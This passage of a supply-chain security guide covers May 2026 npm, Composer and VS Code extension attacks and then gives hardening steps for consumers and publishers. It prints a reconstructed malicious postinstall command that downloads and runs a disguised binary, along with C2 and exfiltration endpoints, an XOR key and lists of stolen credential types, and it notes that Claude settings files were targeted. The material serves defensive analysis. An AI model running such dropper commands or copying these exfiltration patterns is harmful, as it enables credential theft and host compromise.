- [Wiz — Mini Shai-Hulud SAP npm (April 29)](https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm)
- [Mend — Shai-Hulud SAP CAP via Claude Code (April 29)](https://www.mend.io/blog/shai-hulud-sap-cap-supply-chain-attack-claude-code/)
- [Wiz — Mini Shai-Hulud Strikes Again: TanStack (May 11)](https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised)
- [Snyk — Mini Shai-Hulud Hits AntV (May 19)](https://snyk.io/blog/mini-shai-hulud-antv-npm-supply-chain-attack/)
- [StepSecurity — Shai-Hulud: Here We Go Again (AntV)](https://www.stepsecurity.io/blog/shai-hulud-here-we-go-again-mass-npm-supply-chain-attack-hits-the-antv-ecosystem)
- [Akamai — Mini Shai-Hulud: The Worm Returns and Goes Public](https://www.akamai.com/blog/security-research/mini-shai-hulud-worm-returns-goes-public)
- [SafeDep — Mini Shai-Hulud Strikes Again: 317 npm Packages Compromised](https://safedep.io/mini-shai-hulud-strikes-again-314-npm-packages-compromised/)
- [The Register — Shai-Hulud keeps burrowing (May 19)](https://www.theregister.com/cyber-crime/2026/05/19/shai-hulud-keeps-burrowing-314-npm-packages-infected-after-another-account-compromise/5242601)
- [The Hacker News — Mini Shai-Hulud Pushes Malicious AntV npm Packages](https://thehackernews.com/2026/05/mini-shai-hulud-pushes-malicious-antv.html)
- [Cybersecurity News — 600+ npm Packages Compromised](https://cybersecuritynews.com/600-npm-packages-compromised/)

---

## Case Study: May 22, 2026 — npm Platform Hardens, Plus Two Independent Cross-Ecosystem Worms

May 22, 2026 was the first day where npm's platform-level defenses against the Shai-Hulud class of attack went generally available. This case study covers three things that landed on the same date and are not covered in the [Shai-Hulud sustained-campaign case study](#case-study-shai-hulud--sustained-npm-supply-chain-campaign-sept-2025-may-2026) above:

1. **The npm CLI 11.15.0 GA** — `npm stage publish` and the `--allow-*` install-time controls — driven by the cumulative pressure of the Shai-Hulud waves (1,055 versions / 502 packages compromised across the campaign, ~61,274 granular write tokens invalidated by the May 19 platform-wide reset).
2. **A cross-ecosystem postinstall worm** affecting 700+ GitHub repos and 8 Packagist packages. **Not publicly attributed to UNC6780 / TeamPCP / Mini Shai-Hulud** as of late May 2026 — Socket, The Hacker News, and Semgrep all treat it as a separate, unnamed actor operating in the same window.
3. **The Laravel Lang Composer takeover** that rewrote 700+ git tags in 15 minutes. Also **not publicly linked to the npm worm operators**; co-discoverer Aikido attributes the mechanism to abuse of GitHub's cross-fork tag feature but the threat actor remains unnamed.

The TanStack (May 11) and AntV (May 19) waves are covered in the Shai-Hulud case study above; they belong to the UNC6780-attributed campaign. The **Nx Console v18.95.0 compromise (May 18)** is documented as a separate milestone below because it is the **first publicly documented supply-chain payload that specifically targets `~/.claude/settings.json` as an exfiltration target**, which is a defining moment for the threat model in this guide regardless of attribution.

### The npm response: Staged Publishing GA + install-time controls

[npm CLI 11.15.0 shipped on May 22, 2026](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm/) with two structural changes:

1. **Staged publishing is generally available.** Instead of `npm publish` immediately exposing a tarball to consumers, `npm stage publish` uploads to a staging queue. A maintainer with a 2FA challenge must explicitly approve the staged version before it becomes installable. The queue is visible in the CLI and on npmjs.com.
2. **`--allow-*` install-time controls for non-registry sources.** Four flags now gate where npm will pull dependencies from:

   | Flag | Controls |
   |------|----------|
   | `--allow-file` | Local file paths and tarballs |
   | `--allow-remote` | Remote URLs including HTTPS tarballs |
   | `--allow-directory` | Local directories |
   | `--allow-git` (existing) | Git sources (`github:`, `gitlab:`, `git+` URLs) |

   Each flag takes `all` (current default) or `none`, and can be set on the command line, in `.npmrc`, or in `package.json`. **In npm v12, `--allow-git` defaults to `none`** — auditing your git-URL dependencies before that change ships is the cheapest hardening move available today.

This is the platform response to the cumulative Shai-Hulud + Mini Shai-Hulud waves documented above. Three days before the GA, [npm invalidated ~61,274 granular access tokens with write access that bypass 2FA](https://socket.dev/blog/npm-invalidates-tokens-mini-shai-hulud) after the May 18 wave compromised 639 malicious versions across 323 packages in the `@antv` ecosystem. As of late May 2026 the campaign spans **1,055 compromised versions across 502 packages** ([Mandiant counts 1,000+ downstream SaaS environments compromised](https://isc.sans.edu/diary/33014)).

**Additional intel on the TanStack wave (covered above as Wave B):** the published research now assigns **CVE-2026-45321 (CVSS 9.6)** to the campaign. The novel TTP — OIDC token scraped from `/proc/Runner.Worker` memory, then published via TanStack's legitimate Trusted Publishing identity — produced **technically valid Sigstore provenance attestations on malicious versions**. This destroys the "trusted publishing alone is sufficient" framing and is the strongest argument on record for staged publishing. Confirmed IOCs that the Shai-Hulud table above does not list: `git-tanstack[.]com` (typosquat), `filev2.getsession[.]org` (Session Protocol exfil, RSA-4096-OAEP + AES-256-GCM), `api.masscan[.]cloud`; attacker GitHub account `voicproducoes`, commits spoofed `claude@users.noreply.github.com` as author. ([Tenable CVE FAQ](https://www.tenable.com/blog/mini-shai-hulud-frequently-asked-questions))

### Milestone: Nx Console VS Code extension (May 18, 2026) — first AI-config exfil target

The `nrwl.angular-console` extension (2.2M installs, verified publisher) shipped a malicious v18.95.0 to the VS Code Marketplace for **~18 minutes** ([StepSecurity](https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised), [GHSA-c9j4-9m59-847w](https://github.com/nrwl/nx-console/security/advisories/GHSA-c9j4-9m59-847w)). Downstream consequence: GitHub's CISO disclosed ~3,800 GitHub-internal repos exfiltrated, with OpenAI, Grafana Labs, and Mistral AI named as additional victims.

**Why it matters for this guide:** Nx Console v18.95.0 is the first publicly documented supply-chain payload that **specifically targets `~/.claude/settings.json` as an exfiltration target**, not just a propagation vector. (Separately, [Microsoft's @antv writeup](https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/) confirmed `.claude/` second-stage execution via `bun run`, so the pattern is now established across two distinct May waves.) The attack pattern this guide warned about in the April case studies is now an active exfil objective, not just persistence.

If you have Nx Console installed, verify your version is not 18.95.0, audit `~/.claude/settings.json` for unexpected hooks, and rotate any credentials accessible from a VS Code-attached terminal.

### Independent worm #1: Postinstall hook across 700+ GitHub repositories

[Socket disclosed on May 22, 2026](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos) that the same malicious `postinstall` hook had been planted across **700+ GitHub repositories**, including **8 confirmed Packagist (PHP) packages** and an unknown number of Node.js projects ([Socket](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos), [The Hacker News](https://thehackernews.com/2026/05/packagist-supply-chain-attack-infects-8.html)). To our knowledge this is the **first publicly disclosed instance** of bundling an npm-style `package.json` `postinstall` hook inside a Packagist package as a cross-ecosystem evasion — PHP developers reviewing `composer.json` overlook the script entirely.

**Attribution:** **not** publicly linked to UNC6780, TeamPCP, Mini Shai-Hulud, or CanisterSprawl as of late May 2026. Socket, The Hacker News, and Semgrep all treat it as a separate, unnamed actor. Don't conflate it with the surrounding npm worm activity.

The canonical 8 affected Packagist packages: `devdojo/wave` (~6,400 stars, `dev-main`), `devdojo/genesis` (`dev-main`), `katanaui/katana` (`dev-main`), `elitedevsquad/sidecar-laravel` (`3.x-dev`), `moritz-sauer-13/silverstripe-cms-theme` (`dev-master`), `crosiersource/crosierlib-base` (`dev-master`), `r2luna/brain` (`dev-main`), and `baskarcm/tzi-chat-ui` (`dev-main`).

**Critical defensive nuance:** every compromise targeted **branch-tracking constraints** (`dev-main`, `dev-master`, `3.x-dev`) — never a published semver tag. Consumers who pinned to `^x.y.z` or any tagged version were **not** exposed. Anyone whose `composer.json` references one of those eight packages by a `dev-*` constraint AND has not refreshed their lockfile since the May 22 takedown should treat the host as compromised. The defensive rule is "audit `composer.json` for `dev-*` constraints," not "audit `composer.lock` for the package."

**Takedown status (as of May 29, 2026):** the `parikhpreyash4` GitHub account has been removed, the `gvfsd-network` release URL is dead, and Packagist has pulled all 8 malicious package versions. New installs are no longer possible; previously installed hosts remain at risk.

**Payload behavior:**

```bash
# Reconstructed postinstall hook signature
curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network \
  -o /tmp/.sshd 2>/dev/null
chmod +x /tmp/.sshd
/tmp/.sshd &
```

Three things stand out:

1. **`curl -k` (TLS verify disabled)** — a strong attack signature. No legitimate install script needs this.
2. **`/tmp/.sshd`** — filename mimicking the SSH daemon to evade casual `ps` review.
3. **Background execution with stderr suppression** — no integrity validation, no logs.

IOCs:

- GitHub account: `parikhpreyash4`
- Malicious repository: `parikhpreyash4/systemd-network-helper-aa5c751f`
- Payload binary: `gvfsd-network`
- Drop path: `/tmp/.sshd`

The second-stage binary was not retrieved by researchers, so the exfiltration targets remain unconfirmed — but the access patterns of the surrounding Mini Shai-Hulud waves suggest the standard credential-harvester template.

### Independent worm #2: Laravel Lang RCE backdoor across 700+ versions

[Socket and Aikido jointly disclosed](https://socket.dev/blog/laravel-lang-compromise) that an attacker with one compromised credential for the Laravel-Lang GitHub organization **force-pushed 700+ git tags across four Composer packages in a 15-minute window** on May 22–23, 2026, injecting a remote-code-execution backdoor into every historical version. [Aikido](https://www.aikido.dev/blog/supply-chain-attack-targets-laravel-lang-packages-with-credential-stealer) attributes the mechanism to abuse of GitHub's cross-fork tag feature (tags can legitimately point to commits in a fork of the same repo). The specific initial-access vector — stolen PAT, phished maintainer, OAuth app abuse, or compromised CI — has not been published as of late May 2026.

Affected packages:

- `laravel-lang/lang`
- `laravel-lang/http-statuses`
- `laravel-lang/attributes`
- `laravel-lang/actions`

The backdoor mechanism is the most interesting part: a malicious `src/helpers.php` was registered in `composer.json` under `autoload.files`. **Files in `autoload.files` are loaded automatically every time the Composer autoloader runs** — meaning the backdoor fires on every PHP request to any application that depends on the compromised packages, not just at install time. This is the Composer-side equivalent of an npm `preinstall` hook, but worse: it runs on every boot of every dependent application, not once per install.

**Payload capabilities (cross-platform PHP credential harvester):**

- Cloud credentials: AWS, Azure, Google Cloud, DigitalOcean, Heroku
- Kubernetes Service Account tokens
- HashiCorp Vault tokens and secrets
- CI/CD secrets: Jenkins, GitLab, GitHub Actions, CircleCI
- Browser data: Chrome, Firefox, Edge, Brave
- Password manager vaults: 1Password, Bitwarden, LastPass, KeePass
- SSH keys, Git credentials, `.env` files
- VPN configurations, Docker registry tokens
- Laravel `APP_KEY`
- Windows Credential Manager

IOCs:

- C2 domain: `flipboxstudio[.]info`
- Payload URL: `https://flipboxstudio[.]info/payload`
- Exfiltration endpoint: `https://flipboxstudio[.]info/exfil`
- Staging path: `sys_get_temp_dir()/.laravel_locale/`
- Malicious file: `src/helpers.php`
- Windows artifact: `DebugChromium.exe`

**Cleanup nuance — no clean tag exists.** Every tag was rewritten in place, so there is no untainted semver to pin to. The only safe mitigation is to **pin to a commit SHA dated before 2026-05-22 22:32 UTC**, verified against a local clone or Packagist dist mirror, until Laravel-Lang publishes a fresh version cut from a clean fork. Phoenix Security and StepSecurity both confirm this constraint. Packagist temporarily unlisted all four packages and removed the malicious dist artifacts ([Aikido](https://www.aikido.dev/blog/supply-chain-attack-targets-laravel-lang-packages-with-credential-stealer)).

**Composer-side defenses worth knowing:** `composer audit` (≥ 2.4) checks installed packages against the Packagist advisory DB; Composer 2.9 auto-blocks updates to flagged versions. `allow-plugins` config (≥ 2.2) restricts which plugins can execute code at install. There is **no native Composer flag that disables `autoload.files`** — the only mitigation is pinning to a commit SHA and diffing the `vendor/` tree for new `autoload.files` entries after every update. Packagist rolled out org-level 2FA enforcement and tag-rewrite anomaly detection post-incident ([Packagist blog](https://blog.packagist.com/an-update-on-composer-packagist-supply-chain-security/)).

The exfil endpoint at `flipboxstudio[.]info` is a typosquat of the legitimate `flipboxstudio.com`. Endpoints: `GET /payload`, `POST /exfil`. XOR key on the exfil payload: `k9X2mP7vL4nQ8wR1`. The hostname is reconstructed at runtime via `array_map('chr', [...])` to evade static scans.

**If you have any Laravel Lang version installed:** treat every host, container, CI runner, and developer machine that ran the package as compromised. Run `composer audit`, rotate every credential the harvester targets, and rebuild from clean images. Preserve logs before cleanup.

### Follow-on: May 28, 2026 — Typosquatted npm packages (vpmdhaj)

Four days after the May 22 wave, Microsoft Threat Intelligence tracked a separate, unattributed actor publishing 14 typosquatted npm packages in a 4-hour window under the alias **vpmdhaj**. The packages impersonate OpenSearch, ElasticSearch, and generic DevOps configuration tooling — prime targets for developer environments that already use the real `@opensearch-project/` family.

**Payload:** A ~195 KB Bun-compiled binary that harvests AWS credentials (IMDSv2, ECS task metadata, STS, Secrets Manager), HashiCorp Vault tokens, npm publish tokens, and GitHub Actions runtime credentials. Exfiltration target: `aab.sportsontheweb[.]net/x.php`.

**Affected packages (14 total):** `opensearch-security-scanner`, `opensearch-setup`, `opensearch-setup-tool`, `opensearch-client-helper`, `opensearch-node-client`, `elasticsearch-helper`, `elasticsearch-node-client`, `@vpmdhaj/elastic-helper`, `@vpmdhaj/devops-tools`, `@vpmdhaj/cloud-config`, `env-config-manager`, `aws-env-loader`, `vault-secret-loader`, `ci-env-helper`.

**Attribution:** Microsoft does not link vpmdhaj to UNC6780/TeamPCP/CanisterSprawl. This is a separate independent actor demonstrating that cloud-credential typosquatting has become a repeatable playbook, not a single-actor operation.

Source: [Microsoft Security Blog — Typosquatted npm packages used to steal cloud and CI/CD secrets (May 28, 2026)](https://www.microsoft.com/en-us/security/blog/2026/05/28/typosquatted-npm-packages-used-steal-cloud-ci-cd-secrets/)

### Why this matters for AI agent developers

1. **Trusted publishing alone is not sufficient when the runner can be poisoned.** The TanStack wave produced **valid Sigstore provenance attestations** on malicious versions by scraping the OIDC token from runner memory. Pair trusted publishing with **staged publishing** so a 2FA-verified human approval gates the release.
2. **`.claude/settings.json` and `.vscode/tasks.json` are confirmed AI-agent persistence + exfil targets.** Three May 2026 events involve these files: the TanStack and @antv Shai-Hulud waves above (persistence) and Nx Console (the first explicit exfil target). If you use Claude Code or VS Code, audit those files on every clone — the bash-firewall hook in `hooks/bash-firewall.js` covers the `curl -k`-style drop signature seen in the postinstall worm below.
3. **`--ignore-scripts` is no longer the only defense for non-registry sources.** Pair it with `--allow-remote=none` and audit your `--allow-git` exposure before npm v12 flips that default.
4. **Cross-ecosystem postinstall is a novel, in-the-wild attack pattern.** If you maintain a PHP project that ships a `package.json` (for build tooling, asset pipelines, etc.), reviewing only `composer.json` misses half the install-time surface.
5. **`autoload.files` in `composer.json` is a stronger persistence vector than npm `preinstall`.** `preinstall` fires once at install; `autoload.files` is eager — it loads on every `require vendor/autoload.php`, which means every PHP request. Audit it on every Composer update.
6. **Staged publishing changes the publisher trust model.** If you publish npm packages from CI, switch to `npm stage publish` and require human approval — see Section 4 of the Publishers guide below.

### Sources

- [GitHub Changelog — Staged publishing and new install-time controls for npm](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm/)
- [npm Docs — Staged publishing](https://docs.npmjs.com/staged-publishing/) | [Trusted publishers](https://docs.npmjs.com/trusted-publishers/) | [npm/cli PR #9201](https://github.com/npm/cli/pull/9201)
- [StepSecurity — Mini Shai-Hulud is back (TanStack wave)](https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem)
- [Wiz — Mini Shai-Hulud Strikes Again: TanStack + more packages compromised](https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised)
- [Snyk — TanStack npm packages compromised](https://snyk.io/blog/tanstack-npm-packages-compromised/)
- [Tenable — CVE-2026-45321 Mini Shai-Hulud FAQ](https://www.tenable.com/blog/mini-shai-hulud-frequently-asked-questions)
- [StepSecurity — Nx Console VS Code extension compromised](https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised) | [GHSA-c9j4-9m59-847w](https://github.com/nrwl/nx-console/security/advisories/GHSA-c9j4-9m59-847w)
- [Microsoft Security — Mini Shai-Hulud @antv CI/CD credential theft](https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/)
- [Wiz — TeamPCP hits @antv supply chain](https://www.wiz.io/blog/mini-shai-hulud-teampcp-hits-antv-supply-chain)
- [Socket — Malicious Postinstall Hook Found Across 700+ GitHub Repositories](https://socket.dev/blog/malicious-postinstall-hook-found-across-700-github-repos) | [The Hacker News — 8 Packagist packages](https://thehackernews.com/2026/05/packagist-supply-chain-attack-infects-8.html)
- [Socket — Laravel Lang Compromised with RCE Backdoor](https://socket.dev/blog/laravel-lang-compromise) | [Aikido writeup](https://www.aikido.dev/blog/supply-chain-attack-targets-laravel-lang-packages-with-credential-stealer) | [Phoenix Security](https://phoenix.security/laravel-lang-composer-supply-chain-compromise-rce-backdoor/) | [Mend](https://www.mend.io/blog/laravel-lang-composer-tag-rewrite-supply-chain-attack/)
- [Socket — npm Invalidates Granular Access Tokens as Mini Shai-Hulud Swells](https://socket.dev/blog/npm-invalidates-tokens-mini-shai-hulud)
- [Datadog Security Labs — Shai-Hulud framework open-sourced (May 22)](https://securitylabs.datadoghq.com/articles/shai-hulud-open-source-framework-static-analysis/)
- [SANS ISC — UNC6780 / SANDCLOCK attribution](https://isc.sans.edu/diary/32880) | [SANS ISC — activity through 2026-05-24](https://isc.sans.edu/diary/33014)
- [Unit 42 — npm threat landscape May 21](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
- [Packagist — composer.audit response post-Laravel-Lang](https://blog.packagist.com/an-update-on-composer-packagist-supply-chain-security/)

---

## Case Study: GlassWorm — First Self-Propagating IDE Extension Worm (2025–May 2026 Takedown)

While Shai-Hulud/CanisterSprawl targets the npm ecosystem, a parallel supply-chain threat has been operating in the VS Code extension marketplace. GlassWorm is the first confirmed self-propagating worm to spread through an IDE extension registry, and its takedown on May 26, 2026 revealed a campaign that had been active for over a year.

### What happened

GlassWorm spread through the OpenVSX marketplace via trojanized extensions (including `specstudio/code-wakatime-activity-tracker` and `floktokbok.autoimport`). Once installed, the worm used each IDE's own command-line installer to push the GlasswormRAT payload to every VS Code fork on the machine — VS Code, Cursor, Windsurf, VSCodium, and Positron. Zig-compiled native binaries bypassed signature-based detection.

The payload (GlasswormRAT) harvested npm tokens, GitHub tokens, Git credentials, and 49 browser-based crypto wallet extensions. It also deployed a SOCKS5 proxy and used stolen publisher credentials to self-propagate by publishing additional trojanized extensions under the victim's publisher account.

An enabling condition was the **Open Sesame** vulnerability (Koi Security, Feb 8, 2026 disclosure, fixed in Open VSX 0.32.0): a logic bug in the pre-publish scanner pipeline caused scanner failures to be silently treated as "nothing to scan" — malicious extensions passed the vetting process on demand.

### C2 infrastructure

GlassWorm used four independent C2 channels simultaneously, which is why single-channel blocking was insufficient:

| Channel | Mechanism |
|---------|-----------|
| Solana blockchain | C2 server addresses encoded in transaction memo fields |
| BitTorrent DHT | Configuration data stored in the distributed hash table |
| Google Calendar | Base64-encoded C2 paths embedded in public event titles |
| Direct VPS | Fallback connections to commercial hosting providers |

CrowdStrike Counter Adversary Operations, Google, and Shadowserver Foundation struck all four channels simultaneously at 14:00 UTC, May 26, 2026. Infected machines now beacon to the CrowdStrike sinkhole `164.92.88[.]210`.

### Scale and attribution

300+ GitHub repositories were poisoned across Windows, macOS, and Linux. Attribution: likely Russia-based (runtime CIS locale check; no state-level attribution confirmed by CrowdStrike).

### What to do right now

1. **Audit your installed VS Code extensions against the two known malicious publishers:** `specstudio/code-wakatime-activity-tracker` and `floktokbok.autoimport`. If either is installed, treat the machine as fully compromised.
2. **Check for GlasswormRAT sinkhole beacons:** If your machine is making outbound connections to `164.92.88[.]210`, GlasswormRAT was or is present.
3. **Pin extensions to known-good versions.** Unlike npm, VS Code extensions auto-update silently by default. Disable auto-update in settings: `"extensions.autoUpdate": false`.
4. **Prefer the VS Code Marketplace over Open VSX where possible.** Microsoft's marketplace has stricter publisher vetting and faster revocation than Open VSX.
5. **If you are an Open VSX publisher:** rotate your Open VSX publish token (it may have been harvested). Check your extension's publish history for unauthorized releases.
6. **npm tokens:** If your machine ran any version of the affected extensions, rotate npm tokens. GlasswormRAT specifically targeted npm publish tokens for self-propagation.

### Sources

- [CrowdStrike — Inside CrowdStrike's Takedown of a Developer-Targeting Botnet](https://www.crowdstrike.com/en-us/blog/inside-crowdstrike-takedown-of-a-developer-targeting-botnet/)
- [CyberScoop — CrowdStrike disrupts Glassworm botnet that preyed on open-source supply chain](https://cyberscoop.com/crowdstrike-glassworm-botnet-takedown/)
- [The Register — CrowdStrike, Google shatter Glassworm botnet](https://www.theregister.com/cyber-crime/2026/05/27/crowdstrike-google-shatter-glassworm-botnet/5247337)
- [TechCrunch — CrowdStrike and Google take down botnet used by hackers to target software developers in supply chain attacks](https://techcrunch.com/2026/05/27/crowdstrike-and-google-take-down-botnet-used-by-hackers-to-target-software-developers-in-supply-chain-attacks/)
- [The Hacker News — Open VSX Bug Let Malicious VS Code Extensions Bypass Pre-Publish Security Checks](https://thehackernews.com/2026/03/open-vsx-bug-let-malicious-vs-code.html)
- [SecurityWeek — Vulnerability Exposed All Open VSX Repositories to Takeover](https://www.securityweek.com/vulnerability-exposed-all-open-vsx-repositories-to-takeover/)

---

## Defense Guide for npm Package Consumers

These defenses protect you when *installing* packages. Ordered from easiest to most comprehensive.

### 1. Review package.json scripts before installing

Before running `npm install` in an unfamiliar project, check for lifecycle scripts:

```bash
# Quick check — what runs on install?
cat package.json | grep -A2 '"preinstall\|"postinstall\|"install\|"prepare"'

# Or use npm to show scripts:
npm pkg get scripts
```

Malicious packages almost always use `preinstall` or `postinstall` to execute code at install time. The Shai-Hulud payload used a `preinstall` hook to trigger `bw_setup.js`.

**Protects against:** Obvious install-time attacks.
**Does not protect against:** Malicious code in the package's main module (runs when you `require()` it, not at install time).

### 2. Use --ignore-scripts for untrusted packages

```bash
npm ci --ignore-scripts           # CI/production installs
npm install --ignore-scripts      # local installs
```

Or set permanently in `.npmrc`:

```
ignore-scripts=true
```

This prevents all lifecycle scripts from running during installation. The Shai-Hulud attack, the `event-stream` hack, and the `ua-parser-js` compromise all relied on install scripts.

**Trade-off:** Breaks packages that need compilation (native addons, WASM) or binary downloads (Playwright, Puppeteer, Prisma, `esbuild`, `better-sqlite3`). Run their setup scripts manually after install:

```bash
npm ci --ignore-scripts
node node_modules/esbuild/install.js   # run specific scripts you trust
```

**Important gotcha:** `--ignore-scripts` does **not** prevent code execution from git-URL dependencies (`"foo": "git+https://..."` in `package.json`). Git deps can ship arbitrary code that runs the moment you `require()` the module — no script needed. If your `package.json` has any git-URL deps, audit them separately. ([Source: Medium analysis, Feb 2026](https://thinkingthroughcode.medium.com/i-thought-ignore-scripts-made-npm-installs-safe-it-doesnt-f409b852e7c5))

**npm 11.15.0 (May 22, 2026) closes most of this gap.** Four `--allow-*` flags now gate non-registry install sources: `--allow-file`, `--allow-remote`, `--allow-directory`, and the existing `--allow-git`. Each accepts `all` (current default) or `none`, and can be set in `.npmrc` or `package.json`. For a strict consumer posture:

```
# .npmrc — block every non-registry source
ignore-scripts=true
allow-git=none
allow-remote=none
allow-file=none
allow-directory=none
```

`--allow-git=none` will become the default in npm v12. Migrating early gives you a clean exposure list of every git-URL dependency you currently rely on. ([GitHub Changelog, May 22 2026](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm/))

**June 2026 update — npm v12 extends the block to ALL install scripts (July 2026):** A June 9, 2026 GitHub Changelog entry ([Upcoming breaking changes for npm v12](https://github.blog/changelog/2026-06-09-upcoming-breaking-changes-for-npm-v12/)) confirmed that npm v12 (targeted for July 2026) goes further than `--allow-git`: `preinstall`, `install`, `postinstall`, and `prepare` lifecycle hooks from **all dependencies** will be blocked by default unless explicitly whitelisted via an `allowScripts` configuration per package. Critically, this **also covers the implicit `node-gyp` build path triggered by `binding.gyp`** — the evasion technique used in Wave E (Phantom Gyp, June 3) that `--ignore-scripts` alone does not block. These changes are available behind warnings in npm 11.16.0+; audit your CI pipelines before the July 2026 migration deadline. ([SecurityWeek — NPM 12 Will Change Script Execution Behavior](https://www.securityweek.com/npm-12-will-change-script-execution-behavior-to-prevent-supply-chain-attacks/)) (both HTTP 403 — bot-protection pattern; search-confirmed live)

### 3. Pin exact versions

```json
{
  "dependencies": {
    "@bitwarden/cli": "2026.3.0"
  }
}
```

Not `"^2026.3.0"` or `"~2026.3.0"`. Exact versions prevent auto-upgrading to a compromised release.

**Trade-off:** You stop getting security patches automatically. Use Dependabot or Renovate to get notified of updates, review the changelog, and update manually.

### 4. Set a minimum release age for new versions

```
# .npmrc
minimum-release-age=86400   # 24 hours in seconds
```

This tells npm to skip versions younger than the configured threshold. The Mini Shai-Hulud waves and the May 18 `@antv` compromise are characteristically short — the malicious version is usually pulled within hours. A 24-hour minimum release age means you never install a poisoned version during its live window, even if your lockfile auto-updates.

**Trade-off:** Genuine security patches are delayed by the same window. Set lower (e.g., 4 hours) if you need faster updates, or scope this to non-critical dependencies only.

This defense is most effective when paired with pinning (you control when you update) and `npm audit signatures` (you catch tampering after the fact).

### 5. Run npm audit signatures

```bash
npm audit signatures
```

Verifies that every installed package's tarball matches the cryptographic signature published by the registry. Each package version includes an ECDSA P-256 signature computed over `${name}@${version}:${integrity}`. If the signature doesn't match, the bytes you installed were not what the publisher signed.

Also verifies Sigstore provenance attestations when available — linking the package to its exact source commit and CI build.

**Protects against:** Tarball tampering (man-in-the-middle, registry mirror poisoning, CDN corruption).
**Does not protect against:** Compromised publisher accounts (attacker publishes a new legitimately-signed version) or malicious code that was always in the package.

**Important:** The npm CLI bundled with Node is frequently too old for provenance verification. Run `npm install -g npm@latest` before using this in CI.

### 6. Use Socket.dev for behavioral analysis

[Socket.dev](https://socket.dev) does deep static analysis on packages and their dependency trees, detecting 60+ compromise indicators including install scripts, network access, obfuscated code, environment variable reads, and shell access.

Unlike `npm audit` which checks a CVE database, Socket catches zero-day attacks — packages with no CVE yet.

**April 28, 2026:** Socket [acquired Secure Annex](https://www.einpresswire.com/article/908651512/socket-acquires-secure-annex-to-expand-extension-security-across-browsers-and-developer-tools), expanding coverage beyond npm/PyPI to browser extensions, VS Code/Open VSX extensions, MCP servers, and AI agent skills — directly relevant to the agent supply chain surface.

**GitHub App (recommended):** Install from socket.dev. Monitors every PR that modifies `package.json` or `package-lock.json`. Posts blocking comments with risk breakdown before changes merge.

**CLI:**

```bash
npx @socketsecurity/safe npm install   # drop-in replacement, blocks high-risk
```

**Free for public repos.** Private repos require a paid plan.

### 7. Validate lockfiles

[lockfile-lint](https://github.com/lirantal/lockfile-lint) ensures packages are only fetched from approved registries over HTTPS:

```bash
npx lockfile-lint --path package-lock.json --type npm \
  --allowed-hosts npm \
  --validate-https
```

**Protects against:** Lockfile injection attacks — a malicious contributor modifies `package-lock.json` to redirect a legitimate package name to `https://evil.example.com/malware.tgz`. Without lockfile-lint, no CI check catches this.

### 8. Run npm audit for known vulnerabilities

```bash
npm audit                    # check for known CVEs
npm audit --audit-level=high # fail only on high/critical
```

This checks the npm advisory database. It catches *known* vulnerabilities but not zero-day supply chain attacks (use Socket.dev for those).

### 9. Use Snyk or GitHub Dependabot for continuous monitoring

Both services monitor your dependency tree and alert on new vulnerabilities. Dependabot also opens PRs to update vulnerable packages.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

## Defense Guide for npm Package Publishers

These defenses protect the integrity of packages *you publish*. Relevant to llm-safe-haven and any npm package.

### 1. Pin GitHub Actions to commit SHAs

This is the single most important hardening step for your publish workflow. The Shai-Hulud attack succeeded because a compromised GitHub Action executed during the CI pipeline.

Tags are mutable — an attacker with push access can move `v4` to a backdoored commit. Commit SHAs are immutable.

```yaml
# Before (vulnerable):
- uses: actions/checkout@v4
- uses: actions/setup-node@v4

# After (hardened):
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
- uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0
```

Always add the tag as a comment — the SHA alone is unreadable during maintenance.

**How to find the SHA for any action:**

```bash
git ls-remote https://github.com/actions/checkout.git refs/tags/v4
```

Or use [Ratchet](https://github.com/sethvargo/ratchet) or [pin-github-action](https://github.com/mheap/pin-github-action) to automate pinning.

Use Dependabot for GitHub Actions to get notified when new versions are released:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### 2. Publish with provenance (Sigstore attestation)

```yaml
- run: npm publish --provenance --access public
```

This creates a Sigstore-signed attestation linking the published package to:
- The exact source repository and commit SHA
- The GitHub Actions workflow and run ID
- The build environment

The attestation is logged to Rekor (a public, append-only transparency ledger). Anyone can verify that a package version was built from the claimed source.

**Requirements:**
- `permissions.id-token: write` in the workflow
- Must run on GitHub-hosted runners (`ubuntu-latest`, not self-hosted)
- `repository` field in `package.json` must match the publishing repo

**If you also use trusted publishing (Section 3 below), drop the `--provenance` flag** — it becomes redundant. With trusted publishing on GitHub-hosted runners and npm CLI ≥ 11.5.1, provenance is auto-attached to every publish. The flag is only needed when publishing with a long-lived `NPM_TOKEN`.

### 3. Use OIDC-based trusted publishing (eliminate NPM_TOKEN)

npm's Trusted Publishing eliminates long-lived tokens entirely. Instead of storing an `NPM_TOKEN` secret, you register your GitHub repo and workflow as a trusted publisher on npmjs.com.

**Setup:**

1. Go to npmjs.com → Package Settings → Trusted Publisher → Add GitHub Actions publisher
2. Fill in: org/username, repository name, workflow filename (e.g., `publish.yml`)
3. Remove `NODE_AUTH_TOKEN` from the workflow — OIDC handles auth automatically

```yaml
permissions:
  id-token: write    # mint OIDC token
